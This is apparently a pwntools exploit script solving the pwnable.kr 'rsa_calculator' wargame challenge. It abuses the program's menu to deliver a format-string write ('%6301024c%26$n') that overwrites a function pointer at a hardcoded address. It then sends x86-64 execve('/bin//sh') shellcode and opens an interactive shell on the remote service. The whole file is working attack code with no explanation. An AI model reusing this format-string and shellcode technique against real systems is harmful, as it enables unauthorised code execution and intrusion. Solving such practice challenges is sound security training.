from pwn import *

# offset = 12

def set_key(P, q, e, d):
    p.sendlineafter('> ', '1')
    p.sendlineafter('p : ', str(P))
    p.sendlineafter('q : ', str(q))
    p.sendlineafter('e : ', str(e))
    p.sendlineafter('d : ', str(d))

def encrypt(payload):
    p.sendlineafter('> ', '2')
    p.sendlineafter(': ', '1024')
    p.sendlineafter('data\n', payload)

def decrypt(payload):
    p.sendlineafter('> ', '3')
    p.sendlineafter(': ', '1024')
    p.sendlineafter('data\n', payload)

# p=process('./rsa_calculator')
p=remote('pwnable.kr', 9012)

g_pbuf=0x602560
help_addr=0x602518

set_key('10000', '10000', '1', '1')

payload = '%6301024c%26$n'
encrypt(payload)
p.recvuntil('-\n')

pause()

payload = p.recvline()[:-1]+p64(help_addr)
decrypt(payload)

shellcode = '\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\xb0\x3b\x0f\x05'
encrypt(shellcode)

p.sendlineafter('> ', '4')
p.interactive()